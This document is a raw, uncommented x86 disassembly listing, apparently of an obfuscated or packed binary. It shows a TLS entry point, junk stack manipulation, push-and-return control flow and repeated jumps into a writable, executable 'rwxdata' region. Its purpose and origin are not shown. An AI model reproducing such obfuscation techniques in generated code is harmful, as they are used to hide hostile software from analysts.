lea esp [ esp + 0x20 ]
jmp j_sub_1020f20a
sub_101d968a
stc
imul edx edx 0xa
call sub_101d833c
and bx si
bswap bx
jmp sub_101d6177
sub_101d97a3
imul edx edx 0xa
jmp sub_101d3a71
_TLS_Entry_0
jmp sub_101d098e
sub_101e4f8c
bt bx 0xc
and ebx 0xfff
cmc
pushad
add [ ebx + edi ] dx
push [ esp + 0xc ]
pushad
push 0xf43ceed9
pushfd
lea esp [ esp + 0x4c ]
jmp sub_101d8368
sub_1020a43d
lea esp [ esp + 0x24 ]
retn
sub_1020a864
mov esi [ esp + 0x10 ]
push [ esp + 0x10 ]
push esp
mov [ esp + 0x4 ] 0x9b
mov esp ebp
call sub_101d5936
sub_1020a879
pushad
sub_1020a87a
pushad
sub_1020a87b
push ebp
sub_1020a87c
push ebp
sub_1020a87d
mov [ esp + 0x44 ] 0x1cd0ca95
jmp sub_101cb9fd
sub_1020b496
pushfd
mov [ esp + 0x8 ] eax
setae al
jmp rwxdata
cwde
mov [ esp + 0x4 ] 0xb
pushad
cwde
lea eax [ rwxdata ]
call sub_101ce9dc
cmp cl [ ebp - 0x4eee3188 ]
or eax 0x36fd01e
sub_1020bd8d
push esi
push [ esp + 0x4 ]
call sub_1020c166
out 0x43 al
cld
0xf234
j_sub_101d1f12
jmp sub_101d1f12
sub_1020c325
mov ebp [ esp + 0x8 ]
push ebx
pushad
push [ esp + 0x30 ]
retn 0x44
sub_1020c467
test ah 0x0
cmp cl dh
neg dl
cld
pushfd
push [ esp + 0x42 ]
popf
push 0x3f3a6f92
inc esi
call sub_101c58af
mov ebp 0x302ef6f
retn
sub_1020c707
bt sp 0x2
test cl ch
pushad
jmp rwxdata
sub ecx ecx
lea esp [ esp + 0x20 ]
sub_1020d319
push 0x757b54b7
pushfd
push [ esp ]
push esi
mov [ esp + 0x8 ] dh
lea esp [ esp + 0xc ]
jmp rwxdata
call sub_1020f141
sub_1020d90d
rcl al 0x5
shl al 0x6
lea esp [ esp + 0x4 ]
add ebx esp
bts edi 0x16
mov edi ebx
cmc
mov al bh
pushad
mov al 0x2e
call sub_101d6491
sub_1020daec
mov ax [ ss : eax ]
push [ esp ]
jmp rwxdata
call j_sub_1020dcd3
sub_1020ddef
push 0x8df4db9e
mov [ esp + 0x4 ] bx
mov [ esp + 0x4 ] edx
push 0xe6df80e7
push [ esp + 0x4 ]
pushad
pushfd
push [ esp + 0x30 ]
retn 0x34
sub_1020defc
mov [ ebp ] edx
jmp sub_1020e92d
j_sub_1020f20a
jmp sub_1020f20a
j_sub_1020f7d5
jmp sub_1020f7d5
sub_1020e1da
rol bp 0xa
mov [ esp ] esi
seto dh
stc
jmp sub_1020f73d
sub_1020e3f9
mov [ esp + 0x4 ] 0x4f6f
jmp sub_1020e2ef
sub_1020eb94
push [ esp ]
call sub_1020defc
sub_1020ec73
lea edx [ eax - 0x778e0c21 ]
movzx dx al
bswap dx
push ebp
pushfd
pop [ esp ]
bts dx dx
push ebp
rcr dh cl
call sub_1020e1da
sub_1020ecbc
lea esp [ esp + 0x28 ]
jne rwxdata
pushfd
sub ebp 0x2
push eax
push 0x2349af7a
call sub_1020f2dc
test sp di
sub ebp 0x2
pushad
push 0x296f4ce
call sub_1020f81a
sub_1020ee08
mov [ esp ] edx
pushad
lea esp [ esp + 0x20 ]
jmp sub_1020ec73
sub_1020eecf
pushfd
lea esp [ esp + 0x8 ]
jpo rwxdata
call sub_1020ee08
push edx
pushad
push [ esp + 0x4 ]
push edx
lea esp [ esp + 0x28 ]
jmp sub_1020ec73
sub_1020f0c0
pushfd
lea esp [ esp + 0x3c ]
jne rwxdata
or cx sp
mov ecx eax
call sub_1020df21
pushad
call sub_1020f3c5
sub_1020f105
mov dx [ ebp + 0x4 ]
push edi
pushfd
add ebp 0x6
call j_sub_1020f7d5
j_sub_1020f431
jmp sub_1020f431
sub_1020f141
pushfd
mov [ esp + 0x4 ] edx
push 0x7a01be57
pushad
mov [ esp ] 0x6b
pushfd
lea esp [ esp + 0x2c ]
jmp sub_1020ec73
j_sub_1020f863
jmp sub_1020f863
sub_1020f20a
pushad
mov [ esp + 0x1c ] edx
push 0xb3210dfc
pushad
lea esp [ esp + 0x40 ]
jmp sub_1020ec73
sub_1020f299
push [ esp ]
push [ esp ]
jmp rwxdata
mov [ esp + 0x8 ] edx
mov [ esp ] 0xa0
pushad
lea esp [ esp + 0x28 ]
jmp sub_1020ec73
sub_1020f431
pushfd
mov [ esp ] edx
pushfd
pushad
lea esp [ esp + 0x24 ]
jmp sub_1020ec73
j_sub_1020dcd3
jmp sub_1020dcd3
sub_1020f863
pushfd
mov [ esp + 0xc ] edx
pushad
mov [ esp + 0x10 ] 0x6d5002e3
pushfd
push [ esp + 0x30 ]
retn 0x34
